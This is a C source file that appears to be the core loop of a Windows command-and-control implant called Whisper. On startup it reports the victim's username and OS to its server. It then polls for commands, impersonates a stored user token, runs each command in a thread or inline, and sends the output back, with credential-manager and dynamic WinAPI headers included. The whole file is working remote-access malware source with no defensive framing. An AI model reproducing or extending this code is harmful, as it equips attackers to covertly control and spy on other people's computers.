// core, simple with basic control flow.
#include "comms_http.h"
#include "type_conversions.h"
#include "whisper_commands.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include "whisper_credmanager.h"
#include "whisper_structs.h"
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <windows.h> // < might be hodling some defs that we need to dynamically call... deal with later

DWORD execute(HeapStore *heapStorePointer);
void generate_uuid4(char *agent_id);
void execution_setup(HeapStore *heapStorePointer);
void startup_tasks(HeapStore *heapStorePointer);
// ASYNC BEACON!!!
/*
Just starts a thread and lets it run each time, incase it fails or is long
running, it'll send a message back when it's done/ready.

test with this:

shell powershell -c "Start-Sleep -Seconds 120; whoami"

shell echo "TEST"

The echo test will come back first, then the powershell command will do it's
thing, and show up when done.

This is reflected in the command API call, and in the web gui.


*/

// using typedef as it's cleaner, `CONFIG *mystruct` vs `struct CONFIG *mystruct`

int main()
{

    DEBUG_LOG("STARTING");

    // init heap config
    HeapStore *heapStorePointer = calloc(1, sizeof(HeapStore));
    if (heapStorePointer == NULL)
    {
        DEBUG_LOGF(stderr, "Memory allocation failed for HeapStore\n");
        return 1;
    }
    // Initialize the subsystems; if it fails, free memory and exit
    if (initStructs(heapStorePointer) != 0)
    {
        free(heapStorePointer);
        return 1;
    }

    startup_tasks(heapStorePointer);
    // Example of setting the execution mode (you can do this at any point in your code)
    set_execution_mode(EXEC_MODE_SYNC, heapStorePointer); // Initially run synchronously

    while (1)
    {

        execution_setup(heapStorePointer); // Call the command execution function
        DEBUG_LOG("EXECUTION SUCCESS");
        // WhisperSleep(get_sleep_time());
        // Sleep is in MS, so we take the input of sleep time * 1000 to get seconds
        WhisperSleep(1000 * get_sleep_time(heapStorePointer));
    }

    return 0;
}

// Function to execute the command (switching logic)
void execution_setup(HeapStore *heapStorePointer)
{
    // ... command checking logic (when you implement it) ...

    // Setup exec args for the thread run
    // WhisperCreateThread only takes one arg arg, so this is how to pass multiple
    // EXEC_ARGS *exec_args = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(EXEC_ARGS));
    // if (!exec_args)
    //     return; // handle allocation error

    // exec_args->agent_id = agent_id;
    // exec_args->heapStorePointer = heapStorePointer;

    switch (get_execution_mode(heapStorePointer))
    {
    case EXEC_MODE_ASYNC:
    {
        DEBUG_LOG("ASYNC\n");

        // Asynchronous execution (new thread)
        // need to move agent_id into struct with config to fix the mutliple args
        HANDLE thread = WhisperCreateThread(NULL, 0, execute, heapStorePointer, 0, NULL);
        if (thread)
        {
            CloseHandle(thread); // Detach the thread
        }
        else
        {
            DEBUG_LOG("Failed to create thread.\n");
            // HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
        }
        break;
    }
    case EXEC_MODE_SYNC:
    {
        DEBUG_LOG("SYNC/INLINE\n");
        execute(heapStorePointer); // Call the function directly
        // HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
        break;
    }
    default:
        DEBUG_LOG("Invalid execution mode.\n");
        // free heap allocated memory
        // HeapFree(GetProcessHeap(), 0, exec_args);
        break;
    }
}

/**
 * execute - Retrieve and process an inbound command, then send its response.
 * @heapStorePointer: Pointer to the HeapStore containing agent and context information.
 *
 * Sets the thread token, fetches the next command via get_command_data,
 * allocates and populates an OutboundJsonDataStruct, calls agent_send
 * to add metadata, encode, post, and free resources, and finally frees
 * inbound data. Returns 0 on success or non-zero on error.
 */
DWORD WINAPI execute(HeapStore *heapStorePointer)
{
    // Set thread token
    if (!set_thread_token(heapStorePointer->currentUserStore->token))
    {
        DEBUG_LOG("Could not set token!");
    }

    // Fetch inbound command
    InboundJsonDataStruct InboundJsonData =
        get_command_data(heapStorePointer->agentStore->agent_id);
    InboundJsonData.agent_id = heapStorePointer->agentStore->agent_id;

    // Validate inbound command
    if (!InboundJsonData.command)
    {
        DEBUG_LOG("Could not get command");
        free(InboundJsonData.command_id);
        free(InboundJsonData.args);
        return 1;
    }

    DEBUG_LOG("Decoded Command: %s\n", InboundJsonData.command);

    // Allocate outbound structure
    OutboundJsonDataStruct *OutboundJsonData =
        calloc(1, sizeof(*OutboundJsonData));
    if (!OutboundJsonData)
    {
        DEBUG_LOG("Memory allocation failed for OutboundJsonData.");
        free(InboundJsonData.command);
        free(InboundJsonData.command_id);
        free(InboundJsonData.args);
        return 1;
    }

    // Populate agent_id
    OutboundJsonData->agent_id = strdup(
        heapStorePointer->agentStore->agent_id);
    if (!OutboundJsonData->agent_id)
    {
        DEBUG_LOG("Memory allocation failed for agent_id.");
        free(OutboundJsonData);
        free(InboundJsonData.command);
        free(InboundJsonData.command_id);
        free(InboundJsonData.args);
        return 1;
    }

    // Parse command into outbound struct
    parse_command(InboundJsonData.command,
                  InboundJsonData.args,
                  OutboundJsonData,
                  heapStorePointer);

    // Send response and cleanup outbound struct
    agent_send(heapStorePointer,
               OutboundJsonData,
               InboundJsonData.command_id);

    // Free inbound data
    free(InboundJsonData.command);
    free(InboundJsonData.command_id);
    free(InboundJsonData.args);

    return 0;
}

/*
Startup tasks to do for the agent.

*/
void startup_tasks(HeapStore *heapStorePointer)
{
    DEBUG_LOG("STARTUP TASKS");
    // generate a uuid for this agent
    generate_uuid4(heapStorePointer->agentStore->agent_id);

    // Get needed metadata for checkin
    set_current_username(heapStorePointer, get_env("USERNAME"));
    set_os(heapStorePointer, get_env("OS"));

    // send init post to get metadata into server
    agent_send_now(heapStorePointer, "first_connect");
}

void generate_uuid4(char *uuid)
{
    uint8_t bytes[16];

    // Seed the random number generator
    srand((unsigned int)time(NULL));

    // Generate 16 random bytes
    for (int i = 0; i < 16; i++)
    {
        bytes[i] = rand() % 256;
    }

    // Set the version to 4 --> 0100
    bytes[6] = (bytes[6] & 0x0F) | 0x40;

    // Set the variant to 10xxxxxx
    bytes[8] = (bytes[8] & 0x3F) | 0x80;

    // Format UUID as a string
    sprintf_s(uuid, 37,
              "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
              bytes[0], bytes[1], bytes[2], bytes[3],
              bytes[4], bytes[5],
              bytes[6], bytes[7],
              bytes[8], bytes[9],
              bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]);
}
